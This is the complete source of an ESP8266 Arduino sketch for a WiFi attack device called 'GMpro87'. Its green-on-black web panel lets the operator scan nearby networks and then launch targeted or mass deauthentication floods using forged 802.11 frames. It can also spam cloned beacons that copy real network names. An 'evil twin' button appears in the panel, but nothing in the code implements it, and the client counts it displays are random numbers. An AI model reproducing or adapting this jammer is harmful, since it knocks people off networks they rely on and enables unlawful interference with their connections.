#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

extern "C" {
#include "user_interface.h"
}

#define LED_PIN 2 

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int rssi;
  int clients;
  bool selected;
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
String _eventLogs = "";
bool deauthing_active = false;
bool mass_deauth = false;
bool beacon_spam = false;
bool hidden_admin = false;

// Konfigurasi
String config_ssid = "GMpro2";
String config_pass = "Sangkur87";
int beacon_count = 10; 

void addLog(String msg) {
  String entry = "[" + String(millis()/1000) + "s] " + msg;
  _eventLogs = entry + "\n" + _eventLogs;
  if (_eventLogs.length() > 1500) _eventLogs = _eventLogs.substring(0, 1500);
}

void performScan() {
  WiFi.scanDelete();
  int n = WiFi.scanNetworks(false, true); 
  if (n >= 0) {
    for (int i = 0; i < 16; i++) _networks[i].ssid = ""; 
    for (int i = 0; i < n && i < 16; ++i) {
      _networks[i].ssid = (WiFi.SSID(i) == "") ? "*Hidden*" : WiFi.SSID(i);
      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
      _networks[i].ch = WiFi.channel(i);
      _networks[i].rssi = WiFi.RSSI(i);
      _networks[i].clients = os_random() % 5; 
      _networks[i].selected = false;
    }
    addLog("Scan Selesai: " + String(n) + " ditemukan.");
  }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i < size - 1) str += ":";
  }
  return str;
}

void sendDeauth(uint8_t* bssid, uint8_t ch) {
  wifi_set_channel(ch);
  uint8_t pkt[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0,0,0,0,0,0, 0,0,0,0,0,0, 0x00, 0x00, 0x01, 0x00};
  memcpy(&pkt[10], bssid, 6); memcpy(&pkt[16], bssid, 6);
  wifi_send_pkt_freedom(pkt, 26, 0);
}

void handleIndex() {
  if (webServer.hostHeader() != "192.168.4.1") {
    webServer.sendHeader("Location", "http://192.168.4.1", true);
    webServer.send(302, "text/plain", "");
    return;
  }

  // Handle Command via AJAX
  if (webServer.hasArg("scan")) { performScan(); webServer.send(200); return; }
  if (webServer.hasArg("deauth")) { deauthing_active = !deauthing_active; addLog(deauthing_active?"Target Deauth Aktif":"Deauth Berhenti"); webServer.send(200); return; }
  if (webServer.hasArg("mass")) { mass_deauth = !mass_deauth; addLog(mass_deauth?"MASS DEAUTH START":"MASS DEAUTH STOP"); webServer.send(200); return; }
  if (webServer.hasArg("spam")) { 
    beacon_spam = !beacon_spam; 
    if(webServer.hasArg("count")) beacon_count = webServer.arg("count").toInt();
    addLog(beacon_spam?"BEACON SPAM START ("+String(beacon_count)+")":"SPAM STOP");
    webServer.send(200); return; 
  }
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) _networks[i].selected = !_networks[i].selected;
    }
    webServer.send(200); return;
  }
  if (webServer.hasArg("reboot")) { addLog("Rebooting..."); webServer.send(200); delay(500); ESP.restart(); return; }

  // HTML Dash (Struktur Asli 100%)
  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>";
  html += "body{font-family:'Courier New';background:#0d0d0d;color:#0f0;margin:0;padding:10px;}";
  html += ".content{max-width:500px;margin:auto;border:1px solid #0f0;padding:15px;}";
  html += ".header-box{text-align:center;border-bottom:2px solid #0f0;padding-bottom:10px;margin-bottom:15px;}";
  html += ".tabs{display:flex;gap:5px;margin-bottom:15px;} .tabs button{flex:1;background:#222;color:#0f0;border:1px solid #0f0;padding:10px;cursor:pointer;}";
  html += ".active-btn{background:#0f0 !important;color:#000 !important;} .tab-content{display:none;padding-top:15px;} .show{display:block;}";
  html += "table{width:100%;border-collapse:collapse;font-size:10px;table-layout:fixed;} th,td{border:1px solid #0f0;padding:4px;text-align:center;}";
  html += ".btn{background:#000;color:#0f0;border:1px solid #0f0;padding:5px;cursor:pointer;width:100%;font-size:10px;}";
  html += ".btn-on{background:#0f0 !important;color:#000 !important;} textarea{width:100%;height:100px;background:#000;color:#0f0;border:1px solid #0f0;}";
  html += "</style></head><body><div class='content'><div class='header-box'><h2>GMpro87</h2><span>by : 9u5M4n9</span></div>";
  
  html += "<div class='tabs'><button id='bt1' class='active-btn' onclick='openTab(\"m\",\"bt1\")'>MAIN</button><button id='bt2' onclick='openTab(\"a\",\"bt2\")'>ATTACK</button><button id='bt3' onclick='openTab(\"s\",\"bt3\")'>SETTING</button></div>";

  // TAB MAIN
  html += "<div id='m' class='tab-content show'>";
  html += "<div style='display:flex;gap:5px;margin-bottom:10px;'><button class='btn' onclick='go(\"deauth=1\")'>START DEAUTH</button><button class='btn' onclick='location.href=\"/?etwin=1\"'>START ETWIN</button></div>";
  html += "<div style='display:flex;gap:5px;margin-bottom:10px;'><button class='btn' onclick='go(\"scan=1\")' style='background:#222'>SCAN WIFI</button><button class='btn' style='background:#222'>DESELECT ALL</button></div>";
  html += "<table><thead><tr><th>SSID</th><th>CH</th><th>USR</th><th>SNR%</th><th>SELECT</th></tr></thead><tbody>";
  for(int i=0; i<16; i++) {
    if(_networks[i].ssid == "") continue;
    int snr = 2 * (_networks[i].rssi + 100); if(snr > 100) snr = 100;
    String cl = _networks[i].selected ? "btn-on" : "";
    html += "<tr><td>"+_networks[i].ssid+"</td><td>"+String(_networks[i].ch)+"</td><td>"+String(_networks[i].clients)+"</td><td>"+String(snr)+"%</td>";
    html += "<td><button class='btn "+cl+"' onclick='go(\"ap="+bytesToStr(_networks[i].bssid, 6)+"\")'>SELECT</button></td></tr>";
  }
  html += "</tbody></table></div>";

  // TAB ATTACK
  html += "<div id='a' class='tab-content'><h3>Attack Panel</h3>";
  html += "<button class='btn' onclick='go(\"mass=1\")' style='padding:15px;'>START MASS DEAUTH</button><hr>";
  html += "Beacon Count: <input type='number' id='bc' value='"+String(beacon_count)+"' style='width:60px;background:#000;color:#0f0;border:1px solid #0f0;padding:5px;'><br><br>";
  html += "<button class='btn' onclick='go(\"spam=1&count=\"+document.getElementById(\"bc\").value)' style='padding:10px;'>START BEACON SPAM</button></div>";

  // TAB SETTING
  html += "<div id='s' class='tab-content'>Admin SSID:<input type='text' value='"+config_ssid+"' style='width:100%;background:#000;color:#0f0;border:1px solid #0f0;padding:5px;'><br><br>";
  html += "<button class='btn' style='background:#f00;color:#fff;padding:10px' onclick='go(\"reboot=1\")'>SAVE & RESTART</button></div>";

  html += "<hr><h4>Live Logs</h4><textarea id='logBox' readonly></textarea></div>";

  // Script
  html += "<script>function openTab(id,btn){document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('show'));document.querySelectorAll('.tabs button').forEach(x=>x.classList.remove('active-btn'));document.getElementById(id).classList.add('show');document.getElementById(btn).classList.add('active-btn');}";
  html += "function go(q){fetch('/?'+q).then(()=>{if(q.includes('scan')||q.includes('ap'))location.reload();});}";
  html += "setInterval(()=>{fetch('/logs').then(r=>r.text()).then(t=>{var b=document.getElementById('logBox');b.value=t;b.scrollTop=0;});},1000);</script>";
  html += "</body></html>";
  
  webServer.send(200, "text/html", html);
}

void setup() {
  Serial.begin(115200); LittleFS.begin();
  WiFi.mode(WIFI_AP_STA); wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(config_ssid.c_str(), config_pass.c_str(), 1, hidden_admin);
  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.on("/", HTTP_GET, handleIndex);
  webServer.on("/logs", HTTP_GET, [](){ webServer.send(200, "text/plain", _eventLogs); });
  webServer.onNotFound(handleIndex);
  webServer.begin();
  performScan();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  static unsigned long last_atk = 0;
  if (millis() - last_atk >= 200) {
    if (deauthing_active) {
      for(int i=0; i<16; i++) {
        if(_networks[i].selected) {
           sendDeauth(_networks[i].bssid, _networks[i].ch);
        }
      }
    }
    if (mass_deauth) {
      for(int i=0; i<16; i++) {
        if(_networks[i].ssid != "" && _networks[i].ssid != "*Hidden*") {
          sendDeauth(_networks[i].bssid, _networks[i].ch);
        }
      }
    }
    if (beacon_spam) {
      for(int i=0; i < 16 && i < beacon_count; i++) {
        if(_networks[i].ssid == "" || _networks[i].ssid == "*Hidden*") continue;
        uint8_t bcn[128] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x82, 0x04, 0x0b, 0x16, 0x24, 0x30, 0x03, 0x01 };
        bcn[39] = _networks[i].ssid.length(); memcpy(&bcn[40], _networks[i].ssid.c_str(), bcn[39]);
        wifi_send_pkt_freedom(bcn, 40 + bcn[39], 0);
      }
    }
    last_atk = millis();
  }
}
